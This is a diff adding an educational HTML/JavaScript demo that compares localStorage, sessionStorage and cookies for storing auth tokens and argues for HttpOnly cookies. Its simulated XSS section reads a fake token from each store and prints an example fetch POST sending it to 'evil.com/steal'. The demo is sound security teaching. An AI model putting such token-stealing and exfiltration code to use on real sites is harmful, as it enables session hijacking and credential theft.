@@ -1,0 +1,321 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Auth Token Storage Comparison</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #f3f4f6; min-height: 100vh; }
+    .banner { background: #0891b2; color: white; padding: 0.75rem 1.5rem; text-align: center; font-weight: 600; }
+    .container { max-width: 900px; margin: 2rem auto; padding: 0 1.5rem; }
+    h1 { color: #1f2937; margin-bottom: 0.5rem; }
+    .subtitle { color: #6b7280; margin-bottom: 2rem; }
+    h3 { color: #374151; margin-bottom: 0.75rem; }
+    .storage-grid { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 1rem; margin-bottom: 2rem; }
+    .storage-card { background: white; border-radius: 0.75rem; padding: 1.25rem; box-shadow: 0 2px 8px rgba(0,0,0,0.08); }
+    .storage-card h4 { margin-bottom: 0.5rem; font-size: 1.1rem; }
+    .storage-card .status { padding: 0.5rem 0.75rem; border-radius: 0.5rem; font-family: monospace; font-size: 0.8rem; margin-bottom: 0.75rem; min-height: 60px; word-break: break-all; line-height: 1.5; }
+    .status-empty { background: #f3f4f6; color: #6b7280; }
+    .status-set { background: #dcfce7; color: #15803d; border: 1px solid #86efac; }
+    .storage-card button { padding: 0.5rem 0.75rem; border: none; border-radius: 0.5rem; font-size: 0.85rem; cursor: pointer; color: white; margin-right: 0.25rem; margin-bottom: 0.25rem; }
+    .btn-set { background: #0891b2; }
+    .btn-set:hover { background: #0e7490; }
+    .btn-read { background: #7c3aed; }
+    .btn-read:hover { background: #6d28d9; }
+    .btn-clear { background: #dc2626; }
+    .btn-clear:hover { background: #b91c1c; }
+    .attack-section { background: #fef2f2; border: 2px solid #fca5a5; border-radius: 0.75rem; padding: 1.5rem; margin-bottom: 2rem; }
+    .attack-section h3 { color: #dc2626; }
+    .attack-btn { padding: 0.75rem 1.5rem; background: #dc2626; color: white; border: none; border-radius: 0.5rem; font-size: 1rem; cursor: pointer; margin-right: 0.5rem; margin-bottom: 0.5rem; }
+    .attack-btn:hover { background: #b91c1c; }
+    .log { background: #1f2937; color: #f9fafb; padding: 1.25rem; border-radius: 0.75rem; font-family: monospace; font-size: 0.85rem; min-height: 150px; max-height: 400px; overflow-y: auto; line-height: 1.6; }
+    .log .safe { color: #86efac; }
+    .log .danger { color: #fca5a5; }
+    .log .info { color: #93c5fd; }
+    .log .warn { color: #fcd34d; }
+    .comparison-table { width: 100%; border-collapse: collapse; margin-bottom: 2rem; background: white; border-radius: 0.75rem; overflow: hidden; box-shadow: 0 2px 8px rgba(0,0,0,0.08); }
+    .comparison-table th, .comparison-table td { padding: 0.75rem 1rem; text-align: left; border-bottom: 1px solid #e5e7eb; font-size: 0.9rem; }
+    .comparison-table th { background: #f9fafb; color: #374151; font-weight: 600; }
+    .comparison-table .yes { color: #15803d; font-weight: 600; }
+    .comparison-table .no { color: #dc2626; font-weight: 600; }
+    .comparison-table .maybe { color: #b45309; font-weight: 600; }
+    .note { background: #cffafe; border: 2px solid #67e8f9; border-radius: 0.75rem; padding: 1.25rem; margin-bottom: 2rem; }
+    .note p { color: #0891b2; font-size: 0.95rem; }
+  </style>
+</head>
+<body>
+  <div class="banner">Auth Token Storage &mdash; Compare localStorage, sessionStorage, and Cookies</div>
+
+  <div class="container">
+    <h1>Where Should You Store Auth Tokens?</h1>
+    <p class="subtitle">Set tokens in each storage, then simulate an XSS attack to see which ones are vulnerable.</p>
+
+    <div class="storage-grid">
+      <!-- localStorage -->
+      <div class="storage-card">
+        <h4 style="color: #dc2626;">localStorage</h4>
+        <div class="status status-empty" id="ls-status">Empty</div>
+        <button class="btn-set" onclick="setLS()">Set Token</button>
+        <button class="btn-read" onclick="readLS()">Read</button>
+        <button class="btn-clear" onclick="clearLS()">Clear</button>
+      </div>
+
+      <!-- sessionStorage -->
+      <div class="storage-card">
+        <h4 style="color: #b45309;">sessionStorage</h4>
+        <div class="status status-empty" id="ss-status">Empty</div>
+        <button class="btn-set" onclick="setSS()">Set Token</button>
+        <button class="btn-read" onclick="readSS()">Read</button>
+        <button class="btn-clear" onclick="clearSS()">Clear</button>
+      </div>
+
+      <!-- Cookies -->
+      <div class="storage-card">
+        <h4 style="color: #15803d;">Cookies</h4>
+        <div class="status status-empty" id="ck-status">Empty</div>
+        <button class="btn-set" onclick="setCK()">Set Regular</button>
+        <button class="btn-set" onclick="setCKHttp()" style="background: #15803d;">Set "HttpOnly"</button>
+        <button class="btn-read" onclick="readCK()">Read</button>
+        <button class="btn-clear" onclick="clearCK()">Clear</button>
+      </div>
+    </div>
+
+    <div class="attack-section">
+      <h3>Simulate XSS Attack</h3>
+      <p style="color: #374151; font-size: 0.9rem; margin-bottom: 1rem;">Click to simulate what an attacker's injected script would do — try to steal all tokens from every storage location.</p>
+      <button class="attack-btn" onclick="simulateXSS()">Run XSS Attack Simulation</button>
+      <button class="attack-btn" style="background: #7c3aed;" onclick="simulateExfiltration()">Simulate Data Exfiltration</button>
+    </div>
+
+    <h3>Activity Log</h3>
+    <div class="log" id="log">
+      <div class="info">Ready. Set some tokens, then simulate an XSS attack.</div>
+    </div>
+
+    <h3 style="margin-top: 2rem;">Comparison Table</h3>
+    <table class="comparison-table">
+      <thead>
+        <tr>
+          <th>Feature</th>
+          <th>localStorage</th>
+          <th>sessionStorage</th>
+          <th>HttpOnly Cookie</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td>Accessible via JavaScript</td>
+          <td class="no">Yes (vulnerable!)</td>
+          <td class="no">Yes (vulnerable!)</td>
+          <td class="yes">No (safe!)</td>
+        </tr>
+        <tr>
+          <td>XSS can steal token</td>
+          <td class="no">Yes</td>
+          <td class="no">Yes</td>
+          <td class="yes">No</td>
+        </tr>
+        <tr>
+          <td>Persists across tabs</td>
+          <td class="yes">Yes</td>
+          <td class="no">No (per-tab)</td>
+          <td class="yes">Yes</td>
+        </tr>
+        <tr>
+          <td>Persists after browser close</td>
+          <td class="yes">Yes</td>
+          <td class="no">No</td>
+          <td class="maybe">Depends on expiry</td>
+        </tr>
+        <tr>
+          <td>Sent with every request</td>
+          <td class="no">No (manual)</td>
+          <td class="no">No (manual)</td>
+          <td class="yes">Yes (automatic)</td>
+        </tr>
+        <tr>
+          <td>CSRF vulnerable</td>
+          <td class="yes">No</td>
+          <td class="yes">No</td>
+          <td class="maybe">Yes (use SameSite)</td>
+        </tr>
+        <tr>
+          <td>Size limit</td>
+          <td>~5-10 MB</td>
+          <td>~5-10 MB</td>
+          <td>~4 KB</td>
+        </tr>
+      </tbody>
+    </table>
+
+    <div class="note">
+      <p><strong>Note about this demo:</strong> True HttpOnly cookies can only be set by a server (via Set-Cookie header). Since this is a client-side demo, we simulate the concept by showing that JavaScript-set cookies ARE readable, while server-set HttpOnly cookies would NOT be. Open DevTools → Application → Cookies to see the difference.</p>
+    </div>
+  </div>
+
+  <script>
+    const TOKEN = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoic3R1ZGVudCIsInJvbGUiOiJ1c2VyIn0.fake_signature';
+    const log = document.getElementById('log');
+    let firstAction = true;
+
+    function addLog(msg, type = 'info') {
+      if (firstAction) { log.innerHTML = ''; firstAction = false; }
+      const div = document.createElement('div');
+      div.className = type;
+      div.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
+      log.appendChild(div);
+      log.scrollTop = log.scrollHeight;
+    }
+
+    function updateStatus(id, value) {
+      const el = document.getElementById(id);
+      if (value) {
+        el.textContent = value.length > 50 ? value.slice(0, 50) + '...' : value;
+        el.className = 'status status-set';
+      } else {
+        el.textContent = 'Empty';
+        el.className = 'status status-empty';
+      }
+    }
+
+    // localStorage
+    function setLS() {
+      localStorage.setItem('auth_token', TOKEN);
+      updateStatus('ls-status', TOKEN);
+      addLog('Set localStorage token: ' + TOKEN.slice(0, 30) + '...', 'info');
+    }
+    function readLS() {
+      const val = localStorage.getItem('auth_token');
+      updateStatus('ls-status', val);
+      addLog(val ? 'Read localStorage: ' + val.slice(0, 30) + '...' : 'localStorage is empty', val ? 'warn' : 'info');
+    }
+    function clearLS() {
+      localStorage.removeItem('auth_token');
+      updateStatus('ls-status', null);
+      addLog('Cleared localStorage token', 'info');
+    }
+
+    // sessionStorage
+    function setSS() {
+      sessionStorage.setItem('auth_token', TOKEN);
+      updateStatus('ss-status', TOKEN);
+      addLog('Set sessionStorage token: ' + TOKEN.slice(0, 30) + '...', 'info');
+    }
+    function readSS() {
+      const val = sessionStorage.getItem('auth_token');
+      updateStatus('ss-status', val);
+      addLog(val ? 'Read sessionStorage: ' + val.slice(0, 30) + '...' : 'sessionStorage is empty', val ? 'warn' : 'info');
+    }
+    function clearSS() {
+      sessionStorage.removeItem('auth_token');
+      updateStatus('ss-status', null);
+      addLog('Cleared sessionStorage token', 'info');
+    }
+
+    // Cookies
+    function setCK() {
+      document.cookie = `auth_token=${TOKEN}; path=/; SameSite=Lax`;
+      updateStatus('ck-status', 'Regular cookie set (JS-accessible)');
+      addLog('Set regular cookie (JS-accessible)', 'info');
+    }
+    function setCKHttp() {
+      // We can't actually set HttpOnly from JS — that's the whole point!
+      updateStatus('ck-status', 'HttpOnly cookies can ONLY be set by the server via Set-Cookie header!');
+      addLog('Cannot set HttpOnly cookie from JavaScript — this is BY DESIGN!', 'safe');
+      addLog('A real server would send: Set-Cookie: token=xxx; HttpOnly; Secure; SameSite=Lax', 'safe');
+    }
+    function readCK() {
+      const cookies = document.cookie;
+      updateStatus('ck-status', cookies || 'No JS-accessible cookies');
+      if (cookies) {
+        addLog('Read document.cookie: ' + cookies, 'warn');
+        addLog('Note: HttpOnly cookies would NOT appear here!', 'safe');
+      } else {
+        addLog('No cookies accessible via JavaScript', 'info');
+      }
+    }
+    function clearCK() {
+      document.cookie = 'auth_token=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;';
+      updateStatus('ck-status', null);
+      addLog('Cleared cookie', 'info');
+    }
+
+    // XSS Attack Simulation
+    function simulateXSS() {
+      addLog('', 'info');
+      addLog('═══ XSS ATTACK SIMULATION ═══', 'danger');
+      addLog('Attacker script injected. Attempting to steal tokens...', 'danger');
+      addLog('', 'info');
+
+      // Try localStorage
+      const lsToken = localStorage.getItem('auth_token');
+      if (lsToken) {
+        addLog('STOLEN from localStorage: ' + lsToken.slice(0, 40) + '...', 'danger');
+      } else {
+        addLog('localStorage: no token found', 'info');
+      }
+
+      // Try sessionStorage
+      const ssToken = sessionStorage.getItem('auth_token');
+      if (ssToken) {
+        addLog('STOLEN from sessionStorage: ' + ssToken.slice(0, 40) + '...', 'danger');
+      } else {
+        addLog('sessionStorage: no token found', 'info');
+      }
+
+      // Try cookies
+      const cookies = document.cookie;
+      if (cookies && cookies.includes('auth_token')) {
+        addLog('STOLEN from cookies: ' + cookies, 'danger');
+      } else if (cookies) {
+        addLog('Cookies found but no auth_token: ' + cookies, 'warn');
+      } else {
+        addLog('No cookies accessible via JavaScript', 'info');
+      }
+
+      // HttpOnly note
+      addLog('', 'info');
+      addLog('HttpOnly cookies: CANNOT be read by JavaScript!', 'safe');
+      addLog('Even with XSS, HttpOnly tokens are invisible to the attacker.', 'safe');
+      addLog('', 'info');
+      addLog('═══ ATTACK COMPLETE ═══', 'danger');
+    }
+
+    function simulateExfiltration() {
+      addLog('', 'info');
+      addLog('═══ DATA EXFILTRATION SIMULATION ═══', 'danger');
+
+      const stolen = {};
+      const lsToken = localStorage.getItem('auth_token');
+      const ssToken = sessionStorage.getItem('auth_token');
+      const cookies = document.cookie;
+
+      if (lsToken) stolen.localStorage = lsToken;
+      if (ssToken) stolen.sessionStorage = ssToken;
+      if (cookies) stolen.cookies = cookies;
+
+      if (Object.keys(stolen).length > 0) {
+        addLog('Attacker would send to their server:', 'danger');
+        addLog(`fetch("https://evil.com/steal", {`, 'danger');
+        addLog(`  method: "POST",`, 'danger');
+        addLog(`  body: JSON.stringify(${JSON.stringify(stolen, null, 2).split('\n').join(' ')})`, 'danger');
+        addLog(`})`, 'danger');
+        addLog('', 'info');
+        addLog(`Total tokens stolen: ${Object.keys(stolen).length}`, 'danger');
+      } else {
+        addLog('No tokens found in JavaScript-accessible storage.', 'safe');
+      }
+
+      addLog('HttpOnly cookie tokens: NOT included (invisible to JS)', 'safe');
+      addLog('═══ SIMULATION COMPLETE ═══', 'danger');
+    }
+
+    // Initialize display
+    readLS();
+    readSS();
+    readCK();
+    firstAction = true; // Reset after init reads
+  </script>
+</body>
+</html>
